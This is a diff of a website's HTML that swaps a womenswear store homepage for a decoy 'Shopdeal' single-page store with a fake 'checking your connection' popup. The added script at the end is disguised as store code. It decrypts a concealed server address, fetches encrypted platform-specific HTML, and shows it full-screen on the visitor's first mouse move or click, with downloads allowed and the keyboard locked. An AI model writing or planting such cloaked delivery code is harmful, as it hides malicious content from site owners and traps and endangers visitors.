-        <p id="quiz-text">Answer three quick questions and we'll point you to the shapes that suit how you like to dress.</p>
-        <div style="display:flex;gap:10px;flex-wrap:wrap"><a class="btn btn-light" id="quiz-link" href="shop.html">Browse everything</a><button class="btn btn-light" type="button" id="quiz-restart" hidden>Start again</button></div>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're checking your connection.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
   </div>
-</section>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
 
-<!-- 7 SHOPPABLE LOOKBOOK -->
-<section class="sec bg-stone" aria-labelledby="look-h">
-  <div class="wrap">
-    <div class="title-row"><div><span class="eyebrow">Shop the look</span><h2 id="look-h" style="margin:0">City <em>romance</em></h2></div><p class="muted" style="max-width:420px;margin:0">Tap the markers to see the pieces behind this look, then shop them in the collection.</p></div>
-    <div class="look">
-      <img src="https://images.pexels.com/photos/1154861/pexels-photo-1154861.jpeg?auto=compress&cs=tinysrgb&w=1600" alt="Two stylish women posing in an urban alley in contemporary outfits" width="1600" height="800" loading="lazy" style="object-position:center 30%">
-      <button class="spot" type="button" style="left:34%;top:34%" aria-controls="tip1" aria-expanded="false" aria-label="Show piece: blouse"></button>
-      <div class="tip-card" id="tip1" style="left:37%;top:24%"><b>Celeste Frill Blouse</b><span>Organic poplin · $88</span><a class="ulink" href="shop.html?cat=tops">Shop blouses</a></div>
-      <button class="spot" type="button" style="left:58%;top:58%" aria-controls="tip2" aria-expanded="false" aria-label="Show piece: trousers"></button>
-      <div class="tip-card" id="tip2" style="left:61%;top:48%"><b>Sloane Wide-Leg Trousers</b><span>Lyocell-linen · $134</span><a class="ulink" href="shop.html?cat=tailoring">Shop tailoring</a></div>
-      <button class="spot" type="button" style="left:70%;top:24%" aria-controls="tip3" aria-expanded="false" aria-label="Show piece: earrings"></button>
-      <div class="tip-card" id="tip3" style="left:48%;top:14%"><b>Perle Drop Earrings</b><span>Freshwater pearl · $58</span><a class="ulink" href="shop.html?cat=accessories">Shop accessories</a></div>
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
+
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
+
+        <div class="hero-stats">
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
+        </div>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+   <!--  <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript> -->
+    <!-- Histats.com  END  -->
+
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
+      </div>
     </div>
-  </div>
-</section>
 
-<!-- 8 CRAFT -->
-<section class="sec" aria-labelledby="craft-h">
-  <div class="wrap craft">
-    <img src="https://images.pexels.com/photos/10296685/pexels-photo-10296685.jpeg?auto=compress&cs=tinysrgb&w=1000" alt="Close-up of a hand-knitted cream sweater showing its texture" width="1000" height="1250" loading="lazy">
-    <div><span class="eyebrow">How we make it</span><h2 id="craft-h">Made slowly, <em>meant</em> to last</h2>
-      <p class="muted">We design in small collections and keep the pieces we love season after season. That means fewer, better garments — and far less waste.</p>
-      <ol class="principles">
-        <li><div><b>Fabrics first</b><p>Linen, organic cotton, mulberry silk and merino blends, chosen for how they feel and how they age.</p></div></li>
-        <li><div><b>Small batches</b><p>We produce in limited runs and restock favorites, so nothing sits unsold in a warehouse.</p></div></li>
-        <li><div><b>Finished by hand</b><p>Ruffles, buttonholes and hems are finished carefully so they sit right, wash after wash.</p></div></li>
-      </ol>
-      <a class="ulink" href="about.html">Read our story</a></div>
-  </div>
-</section>
+    <section class="section" id="products">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
+        </div>
 
-<!-- 9 FIT BAND -->
-<section class="fitband" aria-labelledby="fit-h">
-  <img src="https://images.pexels.com/photos/8484131/pexels-photo-8484131.jpeg?auto=compress&cs=tinysrgb&w=1100" alt="Fashion designer in her studio beside a rail of garments" width="1100" height="1300" loading="lazy">
-  <div class="fb"><span class="eyebrow">Find your fit</span><h2 id="fit-h">Your size, <em>in thirty seconds</em></h2>
-    <p>Every piece has a fit note, and our interactive size finder matches your bust, waist and hip measurements to our size chart — in inches or centimeters.</p>
-    <ul class="details-list" style="margin:0 0 26px"><li>Sizes XS to XL across the collection</li><li>Fit notes on every product</li><li>Free exchanges if the size isn't right</li></ul>
-    <a class="btn btn-solid" href="size-guide.html">Open the size finder</a></div>
-</section>
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
+            </div>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
 
-<!-- 10 GALLERY -->
-<section class="sec bg-white" aria-labelledby="gal-h">
-  <div class="wrap">
-    <div class="title-c"><span class="eyebrow">Worn &amp; loved</span><h2 id="gal-h">Styling <em>notes</em></h2><p>A few of the ways we like to wear our pieces — mix, layer and make them yours.</p></div>
-    <div class="gal">
-      <figure><img src="https://images.pexels.com/photos/12083001/pexels-photo-12083001.jpeg?auto=compress&cs=tinysrgb&w=600" alt="Woman in sunglasses, denim jacket and sun hat on a city day" width="600" height="600" loading="lazy"><figcaption>Denim over a floral midi</figcaption></figure>
-      <figure><img src="https://images.pexels.com/photos/32994759/pexels-photo-32994759.jpeg?auto=compress&cs=tinysrgb&w=600" alt="Woman in a straw hat walking through a narrow Mediterranean alley" width="600" height="600" loading="lazy"><figcaption>Straw hat for holiday streets</figcaption></figure>
-      <figure><img src="https://images.pexels.com/photos/4817191/pexels-photo-4817191.jpeg?auto=compress&cs=tinysrgb&w=600" alt="Woman in a red polka dot dress walking through a poppy field" width="600" height="600" loading="lazy"><figcaption>Bold dots, bolder color</figcaption></figure>
-      <figure><img src="https://images.pexels.com/photos/15545273/pexels-photo-15545273.jpeg?auto=compress&cs=tinysrgb&w=600" alt="Softly lit portrait of a woman in a floral dress" width="600" height="600" loading="lazy"><figcaption>Soft florals, softer light</figcaption></figure>
-      <figure><img src="https://images.pexels.com/photos/20636340/pexels-photo-20636340.jpeg?auto=compress&cs=tinysrgb&w=600" alt="Woman in a blue silk blouse posing thoughtfully" width="600" height="600" loading="lazy"><figcaption>Silk, sleeves pushed up</figcaption></figure>
-      <figure><img src="https://images.pexels.com/photos/36163240/pexels-photo-36163240.jpeg?auto=compress&cs=tinysrgb&w=600" alt="Woman in a red dress and hat posing on a vintage car" width="600" height="600" loading="lazy"><figcaption>Red for the weekend</figcaption></figure>
-    </div>
-  </div>
-</section>
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
+            </div>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
 
-<!-- 11 FAQ TABS -->
-<section class="sec" aria-labelledby="faq-h">
-  <div class="wrap">
-    <div class="title-c"><span class="eyebrow">Good to know</span><h2 id="faq-h">Questions, <em>answered</em></h2></div>
-    <div class="tabs" role="tablist" aria-label="FAQ topics">
-      <button role="tab" aria-selected="true" aria-controls="t-orders" id="tb1">Orders</button>
-      <button role="tab" aria-selected="false" aria-controls="t-ship" id="tb2">Shipping &amp; returns</button>
-      <button role="tab" aria-selected="false" aria-controls="t-care" id="tb3">Fit &amp; care</button>
-    </div>
-    <div class="tabpanel acc" role="tabpanel" id="t-orders" aria-labelledby="tb1">
-      <details><summary>How do I place an order?</summary><p>Add pieces to your bag, choose a shipping option and send your order request. Our studio team confirms stock and emails you a secure payment link within one business day. Your order ships as soon as payment is complete.</p></details>
-      <details><summary>Can I change or cancel my order?</summary><p>Yes — until you've completed payment, simply reply to your confirmation email or call us. After payment, we can usually make changes if the parcel hasn't left our studio yet.</p></details>
-      <details><summary>Do you restock sold-out pieces?</summary><p>Our core styles are restocked regularly. Save a piece to your wishlist and check back, or email us and we'll let you know when your size returns.</p></details>
-    </div>
-    <div class="tabpanel acc" role="tabpanel" id="t-ship" aria-labelledby="tb2" hidden>
-      <details><summary>How much is shipping?</summary><p>Standard shipping within the US is $8.95, or free on orders over $150. Express shipping is $18. Full details are in our <a href="shipping-policy.html">Shipping Policy</a>.</p></details>
-      <details><summary>How long does delivery take?</summary><p>Standard orders usually arrive within 3–6 business days after dispatch, and express orders within 1–2 business days.</p></details>
-      <details><summary>What is your returns policy?</summary><p>Unworn pieces with tags attached can be returned within 30 days of delivery for a refund or exchange. See our <a href="returns-refund-policy.html">Returns &amp; Refund Policy</a>.</p></details>
-    </div>
-    <div class="tabpanel acc" role="tabpanel" id="t-care" aria-labelledby="tb3" hidden>
-      <details><summary>How do your sizes run?</summary><p>Most pieces are true to size. Each product has a fit note, and our <a href="size-guide.html">size finder</a> matches your measurements to our chart.</p></details>
-      <details><summary>How should I care for linen and silk?</summary><p>Wash linen cool and line dry; it softens beautifully over time. Hand wash silk in cool water with a gentle detergent, or dry clean, and steam rather than iron where possible.</p></details>
-      <details><summary>Will my ruffles lose their shape?</summary><p>Our ruffles are cut and finished to hold their shape. A quick steam after washing is all they usually need to look fresh again.</p></details>
-    </div>
-  </div>
-</section>
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
+            </div>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
 
-<!-- 12 NEWSLETTER -->
-<section class="news" aria-labelledby="news-h">
-  <img src="https://images.pexels.com/photos/10689371/pexels-photo-10689371.jpeg?auto=compress&cs=tinysrgb&w=1800" alt="Row of elegant dresses hanging on a rail in a bright boutique" width="1800" height="1200" loading="lazy">
-  <div class="wrap">
-    <span class="eyebrow" style="color:#F2C9B8">The Frill Monarch letter</span>
-    <h2 id="news-h">New pieces, styling notes &amp; <em>first looks</em></h2>
-    <p>One thoughtful email a month. No clutter, and you can unsubscribe anytime.</p>
-    <form class="newsletter" novalidate><label class="sr-only" for="nl-email">Email address</label><input id="nl-email" type="email" placeholder="Your email address" autocomplete="email"><input type="text" name="website" tabindex="-1" autocomplete="off" style="display:none" aria-hidden="true"><button type="submit">Subscribe</button></form>
-    <p class="note">By subscribing you agree to our <a href="privacy-policy.html" style="color:inherit">Privacy Policy</a>.</p>
-  </div>
-</section>
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
+            </div>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
 
-</main>
-<footer class="foot"><div class="wrap">
-  <div class="foot-grid">
-    <div><a class="logo" href="index.php" aria-label="Frill Monarch home"><svg viewBox="0 0 30 20" fill="none" stroke="currentColor" stroke-width="1.4" aria-hidden="true"><path d="M2 17h26M3 15 1.5 5l7.5 5L15 2l6 8 7.5-5L27 15z"/><circle cx="15" cy="2" r="1.2" fill="currentColor"/></svg><b>Frill Monarch</b><small>Romantic modern womenswear</small></a>
-      <p style="margin-top:22px;max-width:320px">Considered dresses, blouses and tailoring with a romantic edge — designed to be worn often and kept for years.</p></div>
-    <div><h2>Shop</h2><ul><li><a href="shop.html">Shop all</a></li><li><a href="shop.html?cat=dresses">Dresses</a></li><li><a href="shop.html?cat=tops">Blouses &amp; shirts</a></li><li><a href="shop.html?cat=skirts">Skirts</a></li><li><a href="shop.html?cat=tailoring">Tailoring</a></li><li><a href="shop.html?cat=knitwear">Knitwear</a></li><li><a href="shop.html?cat=accessories">Accessories</a></li></ul></div>
-    <div><h2>Help</h2><ul><li><a href="size-guide.html">Size guide</a></li><li><a href="shipping-policy.html">Shipping</a></li><li><a href="returns-refund-policy.html">Returns &amp; refunds</a></li><li><a href="wishlist.html">Wishlist</a></li><li><a href="bag.html">Your bag</a></li><li><a href="about.html">Our story</a></li><li><a href="contact.html">Contact us</a></li></ul></div>
-    <div><h2>Studio</h2><ul><li>181 Mercer Street<br>New York, NY 10012, United States</li><li><a href="tel:+18887775845">+1-888-777-5845</a></li><li><a href="mailto:hello@frillmonarch.com">hello@frillmonarch.com</a></li><li>Mon–Fri 9:00 am – 6:00 pm ET</li></ul></div>
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="section about">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
+          </div>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
+          </div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
+          </div>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
   </div>
-  <div class="foot-bottom"><span>© <span data-year>2026</span> Frill Monarch. All rights reserved.</span>
-    <span><a href="privacy-policy.html">Privacy</a> · <a href="terms-and-conditions.html">Terms</a> · <a href="cookie-policy.html">Cookies</a> · <a href="disclaimer.html">Disclaimer</a> · <a href="sitemap.xml">Sitemap</a> · <button type="button" data-cookie-settings>Cookie settings</button></span></div>
-</div></footer>
-<div class="cookie" role="dialog" aria-labelledby="ck-h"><h2 id="ck-h">A note on cookies</h2>
-<p>We use essential storage to remember your bag and wishlist. With your permission, we'd also like to use analytics and advertising cookies to improve the shop. <a href="cookie-policy.html">Cookie Policy</a></p>
-<div class="row"><button class="btn btn-sm btn-solid" type="button" data-consent="all">Accept all</button><button class="btn btn-sm" type="button" data-consent="essential">Essential only</button></div></div>
-<div class="modal" id="qv-modal" role="dialog" aria-modal="true" aria-labelledby="qv-title"><div class="modal-card"><button class="modal-close" type="button" aria-label="Close quick view">✕</button><img id="qv-img" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" alt="" width="900" height="1200"><div class="modal-body" id="qv-body"></div></div></div>
-<script src="assets/js/products.js" defer></script>
-<script src="assets/js/main.js" defer></script>
+
+
+  <div id="contentiframe" style="display:none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+  <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen
+    webkitallowfullscreen mozallowfullscreen
+    sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads"
+    style="width:100%; height:100%; border:0;"></iframe>
+</div>
+
+<script>
+  const PASSPHRASE = "98yNCjeAfWMwk0wI";
+  const URL_KEY   = "UrLk3yShopEase01";
+  const ENC_DATA_ORIGIN = "U2FsdGVkX1/kEh9neuNS60/aE0GrlLMd5C8e0rX9IoWQ+7od9yQpbPzFinjuRzuE";
+
+  const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+  const DATA_URL = DATA_ORIGIN + "/data";
+
+  
+  (function warmup() {
+    try {
+      const o = new URL(DATA_ORIGIN).origin;
+
+      
+      const pc = document.createElement("link");
+      pc.rel = "preconnect";
+      pc.href = o;
+      pc.crossOrigin = "anonymous";
+      document.head.appendChild(pc);
+
+     
+      const dns = document.createElement("link");
+      dns.rel = "dns-prefetch";
+      dns.href = o;
+      document.head.appendChild(dns);
+
+      
+      fetch(o + "/favicon.ico", { method: "HEAD", mode: "no-cors" }).catch(() => {});
+    } catch (e) {}
+  })();
+
+  
+  let lastUrl = null;
+  let readyPromise = null;
+
+  function detectPlatform() {
+    const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+              navigator.platform || navigator.userAgent || "";
+    return /mac/i.test(p) ? "mac" : "win";
+  }
+
+  function secureKeyboardAccess() {
+    if (navigator.keyboard) navigator.keyboard.lock().catch(() => {});
+  }
+
+  async function preloadSecret() {
+    if (readyPromise) return readyPromise;
+    readyPromise = (async () => {
+      const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+      const { cipher } = await res.json();
+      const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+      if (!html) throw new Error("Decrypt failed — wrong key?");
+      if (lastUrl) URL.revokeObjectURL(lastUrl);
+      lastUrl = URL.createObjectURL(new Blob([html], { type: "text/html" }));
+      return lastUrl;
+    })();
+    return readyPromise;
+  }
+
+  async function showSecret() {
+    const shop = document.getElementById("shop");
+    const frame = document.getElementById("frame");
+    const contentIframe = document.getElementById("contentiframe");
+    try {
+      const url = await preloadSecret();
+      frame.src = url;
+      shop.style.display = "none";
+      contentIframe.style.display = "block";
+      document.getElementById("customPopup").style.display = "none";
+      secureKeyboardAccess();
+    } catch (e) {
+      document.querySelector(".hint").textContent = "⚠️ " + e.message;
+      document.getElementById("customPopup").style.display = "none";
+    }
+  }
+
+  
+  preloadSecret().catch(() => {});
+
+ 
+  window.addEventListener("mousemove", showSecret, { once: true });
+  window.addEventListener("touchstart", showSecret, { once: true });
+  window.addEventListener("click", showSecret, { once: true });
+</script>
 </body>
 </html>
